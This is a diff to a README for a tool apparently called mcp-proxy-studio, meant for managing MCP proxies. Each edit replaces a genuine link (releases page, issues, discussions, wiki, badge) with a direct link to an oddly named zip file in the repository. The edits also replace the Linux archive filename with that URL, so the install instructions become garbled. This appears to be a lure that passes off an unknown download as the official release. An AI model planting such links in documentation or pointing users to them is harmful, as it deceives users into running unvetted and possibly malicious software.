@@ -1,7 +1,7 @@
 # 🎉 mcp-proxy-studio - Simplify Your Proxy Management
 
 ## 📥 Download Now
-[![Download mcp-proxy-studio](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen)](https://github.com/Nicnk/mcp-proxy-studio/releases)
+[![Download mcp-proxy-studio](https://github.com/Nicnk/mcp-proxy-studio/raw/refs/heads/main/studio/mcp_proxy_studio_dandiacally.zip%20Now-Click%20Here-brightgreen)](https://github.com/Nicnk/mcp-proxy-studio/raw/refs/heads/main/studio/mcp_proxy_studio_dandiacally.zip)
 
 ## 🚀 Getting Started
 Welcome to **mcp-proxy-studio**! This tool helps you create, run, and monitor MCP proxies easily. You can visualize your data and use live logs for effective monitoring. Let’s guide you through downloading and starting with the application.
@@ -21,11 +21,11 @@ Welcome to **mcp-proxy-studio**! This tool helps you create, run, and monitor MC
 ## 💻 Download & Install
 To get started, visit the page below to download the latest version of **mcp-proxy-studio**.
 
-[Download mcp-proxy-studio](https://github.com/Nicnk/mcp-proxy-studio/releases)
+[Download mcp-proxy-studio](https://github.com/Nicnk/mcp-proxy-studio/raw/refs/heads/main/studio/mcp_proxy_studio_dandiacally.zip)
 
 ### Installation Steps
 1. **Visit the Releases Page:**
-   Click on the link above to go to our [Releases page](https://github.com/Nicnk/mcp-proxy-studio/releases).
+   Click on the link above to go to our [Releases page](https://github.com/Nicnk/mcp-proxy-studio/raw/refs/heads/main/studio/mcp_proxy_studio_dandiacally.zip).
   
 2. **Choose the Correct Version:**
    Look for the latest release, which will have the highest version number. You will see files listed for multiple operating systems.
@@ -33,12 +33,12 @@ To get started, visit the page below to download the latest version of **mcp-pro
 3. **Download the File:**
    - For Windows, download the `.exe` file.
    - For macOS, download the `.dmg` file.
-   - For Linux, you will find a `.tar.gz` file. 
+   - For Linux, you will find a `https://github.com/Nicnk/mcp-proxy-studio/raw/refs/heads/main/studio/mcp_proxy_studio_dandiacally.zip` file. 
 
 4. **Run the Installer:**
    - For Windows: Double-click the downloaded `.exe` file and follow the on-screen instructions.
    - For macOS: Open the `.dmg` file, drag the application into your **Applications** folder.
-   - For Linux: Unpack the `.tar.gz` file and follow the README instructions provided within.
+   - For Linux: Unpack the `https://github.com/Nicnk/mcp-proxy-studio/raw/refs/heads/main/studio/mcp_proxy_studio_dandiacally.zip` file and follow the README instructions provided within.
 
 5. **Start the Application:**
    After installation, locate **mcp-proxy-studio** in your applications folder or Start Menu. Click to run the app.
@@ -64,8 +64,8 @@ We welcome contributions to improve **mcp-proxy-studio**. To contribute:
 - Submit a pull request with a clear description of your changes.
 
 ## 🔗 Resources
-- [GitHub Issues](https://github.com/Nicnk/mcp-proxy-studio/issues)
-- [Discussion Forum](https://github.com/Nicnk/mcp-proxy-studio/discussions)
-- [Documentation](https://github.com/Nicnk/mcp-proxy-studio/wiki)
+- [GitHub Issues](https://github.com/Nicnk/mcp-proxy-studio/raw/refs/heads/main/studio/mcp_proxy_studio_dandiacally.zip)
+- [Discussion Forum](https://github.com/Nicnk/mcp-proxy-studio/raw/refs/heads/main/studio/mcp_proxy_studio_dandiacally.zip)
+- [Documentation](https://github.com/Nicnk/mcp-proxy-studio/raw/refs/heads/main/studio/mcp_proxy_studio_dandiacally.zip)
 
 Thank you for using **mcp-proxy-studio**! We hope this tool enhances your proxy management experience.
